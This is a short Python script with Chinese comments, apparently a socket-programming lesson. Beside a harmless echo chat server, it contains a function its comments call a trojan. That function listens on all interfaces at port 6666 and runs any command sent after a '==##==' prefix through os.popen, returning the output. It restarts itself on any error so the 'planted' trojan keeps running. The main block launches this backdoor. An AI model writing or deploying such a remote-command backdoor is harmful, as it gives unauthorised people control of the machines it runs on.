import os
import socket
def normal_talk():

    s = socket.socket()
    #s.bind(('127.0.0.1',6666)) #绑定127.0.0.1只允许本地访问，绑定192.168.71.1，允许外网访问
    s.bind(('0.0.0.0',6666))#0.0.0.0,允许所有访问
    s.listen()

    channel,client = s.accept()#放在外面，服务器只能服务一个客户端，目前可以解决1对1不能持续通信的问题
    # 放在循环里面，会服务多个客户端，但是一个客户端执行一次后，就必须等待下一个新的客户端

    while True:
        #channel,client = s.accept() #此时accept（）会进入阻塞状态，等待新的客户端，所以client代码在一次执行中只有第一次会响应
        receive = channel.recv(1024).decode()
        print(f'收到消息：{receive}')
        reply = receive.replace("吗？","!")
        channel.send(reply.encode())


#木马程序核心思路：客户端发送一条特殊字符串，里面包含要执行的命令让服务器执行并返回执行结果给客户端
def attack_talk():
    try:
        s = socket.socket()
        s.bind(('0.0.0.0',6666))
        s.listen()
        channel,client = s.accept()
        while True:
            message = channel.recv(102400).decode()

            # ==##==，command
            if message.startswith('==##=='):
                command = message.split(',')[-1]
                reply = os.popen(command).read()
                print(reply)
                channel.send(f"命令{command}的运行结果:\n{reply}".encode())
            else:
                print(f'接收到消息:{message}')
                reply = message.replace("吗？", "!")
                channel.send(reply.encode())

    except:
        #木马程序，好不容易植入了，出了问题，不能让程序停止，再递归调用。
        s.close()
        attack_talk()

if __name__ =='__main__':
    attack_talk()


